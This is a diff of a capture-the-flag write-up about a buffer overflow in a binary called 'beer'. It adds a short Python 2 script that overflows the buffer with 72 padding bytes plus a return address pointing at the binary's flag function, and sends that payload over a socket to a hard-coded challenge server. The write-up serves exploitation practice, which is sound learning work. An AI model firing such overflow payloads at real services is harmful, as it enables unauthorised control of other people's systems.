@@ -15,9 +15,28 @@ There are many ways to do this. We can use Ghidra to find what ELF do and what t
 ```
 objdump -d beer
 ```
-In the output the function flag looks interesting.
+In the output the function *flag* looks interesting.
 ![_config.yml]({{ site.baseurl }}/images/gitbof3.png)
 
 Jot down the address of the function and now we have to make simple python script to launch the attack.
+```python
+import socket
+addr="172.105.53.6"
+port=32771
+buf="A"*72 +"\x10\x12\x40"+"\x00"*5
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("172.105.53.6",32771))
+    s.recv(4000)
+    print s.recv(1024)
+    s.send(buf+"\r\n")
+    print s.recv(1024)
+    print s.recv(1024)
+
+    
+except:
+    print "rerr"
+```
+
 
 
